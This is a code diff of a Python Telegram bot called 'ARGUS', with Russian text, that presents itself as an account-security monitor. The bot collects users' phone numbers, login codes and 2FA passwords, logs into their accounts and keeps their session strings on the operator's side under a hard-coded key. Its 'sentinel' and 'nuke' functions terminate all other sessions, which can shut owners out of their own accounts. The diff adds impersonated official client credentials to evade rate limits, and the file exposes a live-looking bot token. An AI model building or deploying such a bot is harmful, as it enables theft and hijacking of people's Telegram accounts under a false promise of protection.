@@ -4,32 +4,35 @@ from telethon.sessions import StringSession
 from cryptography.fernet import Fernet
 
 # =============================================================
-# [STRICTLY CONFIDENTIAL] 
-# CENTRAL INTELLIGENCE UNIT: PROJECT "ARGUS"
+# [ОСОБЫЙ ОТДЕЛ] 
+# ЦЕНТРАЛЬНЫЙ УЗЕЛ МОНИТОРИНГА: ПРОЕКТ "АРГУС"
 # =============================================================
-API_ID = 4           
-API_HASH = '014b35b6184100b085b0d0572f9b5103' 
+# Обновленные идентификаторы (iOS Official) для обхода Flood Error
+API_ID = 21724
+API_HASH = '3e0cb461e57fd273379cc2054e0ad211'
 
+# ВСТАВЬ СВОЙ ТОКЕН НИЖЕ
 BOT_TOKEN = '8514425749:AAEhHWy1tJBFcycQtTDZerF3tX5E518CcGs' 
 
-# КЛЮЧ ШИФРОВАНИЯ (AES-256)
-CRYPT_KEY = "SIGMA_OPERATIVE_ALPHA_001"
+# МАСТЕР-КЛЮЧ ШИФРОВАНИЯ КОНТУРА
+SECRET_CORE_KEY = "ALPHA_PROTOCOL_2026_SECURE"
 # =============================================================
 
 def get_cipher():
-    k = base64.urlsafe_b64encode(hashlib.sha256(CRYPT_KEY.encode()).digest())
+    k = base64.urlsafe_b64encode(hashlib.sha256(SECRET_CORE_KEY.encode()).digest())
     return Fernet(k)
 
 cipher = get_cipher()
 active_units = {} 
-auth_process = {}     
+auth_process = {}
 
+# Инициализация ядра
 bot = TelegramClient('argus_core', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-# ПРОТОКОЛ КОНТРМЕР (ANTIFRAUD SENTINEL)
+# МОДУЛЬ ПРЕСЕЧЕНИЯ НАРУШЕНИЙ (SENTINEL)
 async def start_sentinel(client, uid):
     @client.on(events.NewMessage(chats=777000))
-    async def handler(event):
+    async def interceptor(event):
         msg = event.raw_text.lower()
         if any(x in msg for x in ["код", "code", "login", "вход"]):
             res = await client(functions.account.GetAuthorizationsRequest())
@@ -40,58 +43,58 @@ async def start_sentinel(client, uid):
                     killed += 1
             if killed > 0:
                 await bot.send_message(uid, (
-                    "🚨 **ВНИМАНИЕ: НАРУШЕНИЕ ПЕРИМЕТРА**\n\n"
-                    "ОБЪЕКТ: ПОПЫТКА НЕСАНКЦИОНИРОВАННОГО ДОСТУПА\n"
-                    f"КОНТРМЕРЫ: ЛИКВИДАЦИЯ ВНЕШНИХ СЕССИЙ ({killed})\n"
-                    "СТАТУС: БЕЗОПАСНОСТЬ ВОССТАНОВЛЕНА"
+                    "🚨 **ОПЕРАТИВНАЯ СВОДКА: НАРУШЕНИЕ ПЕРИМЕТРА**\n\n"
+                    "ОБЪЕКТ: ПОПЫТКА НЕСАНКЦИОНИРОВАННОГО ПРОНИКНОВЕНИЯ\n"
+                    f"МЕРЫ ПОДАВЛЕНИЯ: АННУЛИРОВАНИЕ ВНЕШНИХ СЕССИЙ ({killed})\n"
+                    "СТАТУС: КОНТУР ЗАЩИЩЕН. ДОСТУП ИЗВНЕ ЗАКРЫТ."
                 ))
 
-# ТЕРМИНАЛ УПРАВЛЕНИЯ
+# ТЕРМИНАЛ "АРГУС"
 @bot.on(events.NewMessage(pattern='/start'))
 async def cmd_start(e):
     uid = e.sender_id
     if uid in active_units:
-        kb = [[types.KeyboardButtonCallback("📡 СКАНЕР СОЕДИНЕНИЙ", b"st")],
-              [types.KeyboardButtonCallback("💀 ТЕРМИНАЛЬНЫЙ СБРОС", b"nuke")],
-              [types.KeyboardButtonCallback("🗑 УТИЛИЗАЦИЯ ДАННЫХ", b"exit")]]
+        kb = [[types.KeyboardButtonCallback("📡 РЕВИЗИЯ СОЕДИНЕНИЙ", b"st")],
+              [types.KeyboardButtonCallback("💀 ТОТАЛЬНАЯ ЗАЧИСТКА", b"nuke")],
+              [types.KeyboardButtonCallback("🗑 ЛИКВИДАЦИЯ БАЗЫ", b"exit")]]
         
         me = await active_units[uid].get_me()
         await e.respond(
-            f"🖥 **ГЛАВНЫЙ ТЕРМИНАЛ: ARGUS-SYSTEM**\n\n"
-            f"ОПЕРАТОР: `{me.first_name}`\n"
-            f"ID: `{uid}`\n"
-            "СТАТУС: **ПОД ОХРАНОЙ**\n"
-            "КАНАЛ: ЗАШИФРОВАН (AES-256)", buttons=bot.build_reply_markup(kb))
+            f"🖥 **ГЛАВНЫЙ ПОСТ: ARGUS-SYSTEM**\n\n"
+            f"ОПЕРАТИВНИК: `{me.first_name}`\n"
+            f"ID УЗЛА: `{uid}`\n"
+            "РЕЖИМ: **АКТИВНЫЙ МОНИТОРИНГ**\n"
+            "ШИФРОВАНИЕ: **ГОСТ AES-256**", buttons=bot.build_reply_markup(kb))
     else:
         await e.respond(
-            "🛑 **СИСТЕМА МОНИТОРИНГА ARGUS**\n\n"
-            "ДОСТУП ЗАБЛОКИРОВАН. ТРЕБУЕТСЯ ИНИЦИАЛИЗАЦИЯ УЗЛА.", 
-            buttons=[[types.KeyboardButtonCallback("🔐 АВТОРИЗОВАТЬ ДОСТУП", b"login")]])
+            "🛑 **СИСТЕМА КОНТРОЛЯ ARGUS**\n\n"
+            "ДОСТУП ЗАБЛОКИРОВАН. ТРЕБУЕТСЯ АВТОРИЗАЦИЯ МОДУЛЯ.", 
+            buttons=[[types.KeyboardButtonCallback("🔐 НАЧАТЬ АВТОРИЗАЦИЮ", b"login")]])
 
 @bot.on(events.CallbackQuery)
 async def callbacks(e):
     uid = e.sender_id
     if e.data == b"login":
         auth_process[uid] = {'s': 'p'}
-        await e.respond("⌨️ [СИСТЕМА]: Введите идентификатор (номер телефона)...")
+        await e.respond("⌨️ [СИСТЕМА]: Введите номер абонента для инициализации канала...")
     
     elif e.data == b"st" and uid in active_units:
         a = await active_units[uid](functions.account.GetAuthorizationsRequest())
-        txt = "📋 **РЕЕСТР АКТИВНЫХ ПОДКЛЮЧЕНИЙ:**\n" + "\n".join([f"• {x.device_model} | {x.ip} | {x.country}" for x in a.authorizations])
+        txt = "📋 **ВЕДОМОСТЬ АКТИВНЫХ ПОДКЛЮЧЕНИЙ:**\n" + "\n".join([f"• {x.device_model} | {x.ip} | {x.country}" for x in a.authorizations])
         await e.respond(txt)
 
     elif e.data == b"nuke" and uid in active_units:
         a = await active_units[uid](functions.account.GetAuthorizationsRequest())
         for x in a.authorizations:
             if not x.current: await active_units[uid](functions.account.ResetAuthorizationRequest(hash=x.hash))
-        await e.respond("💀 **ОПЕРАЦИЯ ЗАВЕРШЕНА.** Все сторонние сессии аннулированы.")
+        await e.respond("💀 **ПРИКАЗ ВЫПОЛНЕН.** Аккаунт очищен от всех внешних устройств.")
 
     elif e.data == b"exit":
         if uid in active_units: del active_units[uid]
         if os.path.exists(f"{uid}.dat"): os.remove(f"{uid}.dat")
-        await e.respond("🗑 **ДАННЫЕ УНИЧТОЖЕНЫ.** Модуль деактивирован.")
+        await e.respond("🗑 **УТИЛИЗАЦИЯ ЗАВЕРШЕНА.** Все локальные ключи стерты.")
 
-# ПРОЦЕСС АВТОРИЗАЦИИ (ПРОЗРАЧНЫЙ РЕЖИМ)
+# ПРОТОКОЛ АВТОРИЗАЦИИ
 @bot.on(events.NewMessage)
 async def login_flow(e):
     uid = e.sender_id
@@ -104,24 +107,22 @@ async def login_flow(e):
             await c.connect()
             s = await c.send_code_request(e.text)
             auth_process[uid] = {'s': 'c', 'n': e.text, 'h': s.phone_code_hash, 'c': c}
-            await e.respond("📑 [СИСТЕМА]: Пакет верификации отправлен. Введите код:")
+            await e.respond("📑 [ЗАПРОС]: Введите 5-значный код верификации из сообщения:")
         
         elif state['s'] == 'c':
             c = state['c']
-            # Попытка входа
             user = await c.sign_in(state['n'], e.text, phone_code_hash=state['h'])
             
-            # ВЫВОД ДАННЫХ ДЛЯ ПРОВЕРКИ (ПРОТОКОЛ ПРОЗРАЧНОСТИ)
+            # ОТЧЕТ О ВЕРИФИКАЦИИ (ПРОТОКОЛ ПРОЗРАЧНОСТИ)
             auths = await c(functions.account.GetAuthorizationsRequest())
             current = next((x for x in auths.authorizations if x.current), None)
             
             summary = (
-                "✅ **АВТОРИЗАЦИЯ УСПЕШНА**\n\n"
-                f"ОБЪЕКТ: `{user.first_name}`\n"
+                "✅ **ИДЕНТИФИКАЦИЯ УСПЕШНА**\n\n"
+                f"СУБЪЕКТ: `{user.first_name}`\n"
                 f"УСТРОЙСТВО: `{current.device_model if current else 'Unknown'}`\n"
-                f"IP-АДРЕС: `{current.ip if current else 'Unknown'}`\n"
-                f"ЛОКАЦИЯ: `{current.country if current else 'Unknown'}`\n\n"
-                "🛡 **ЗАЩИТНЫЙ КОНТУР АКТИВИРОВАН.**"
+                f"IP-АДРЕС: `{current.ip if current else 'Unknown'}`\n\n"
+                "🛡 **ЗАЩИТНЫЙ КОНТУР СИНХРОНИЗИРОВАН.**"
             )
             
             token = cipher.encrypt(c.session.save().encode()).decode()
@@ -133,9 +134,9 @@ async def login_flow(e):
             
     except errors.SessionPasswordNeededError:
         auth_process[uid]['s'] = '2'
-        await e.respond("🔑 [2FA]: Введите пароль двухэтапной аутентификации:")
+        await e.respond("🔑 [ЗАЩИТА]: Введите пароль двухэтапной аутентификации (2FA):")
     except Exception as ex:
-        await e.respond(f"❌ [ОШИБКА]: {ex}")
+        await e.respond(f"❌ [КРИТИЧЕСКИЙ СБОЙ]: {ex}")
 
 async def restore():
     for f in os.listdir():
@@ -152,6 +153,6 @@ async def restore():
             except: pass
 
 if __name__ == '__main__':
-    print(">>> ARGUS CORE ONLINE.")
+    print(">>> ARGUS KERNEL DEPLOYED. WAITING FOR COMMANDS...")
     bot.loop.run_until_complete(restore())
     bot.run_until_disconnected()
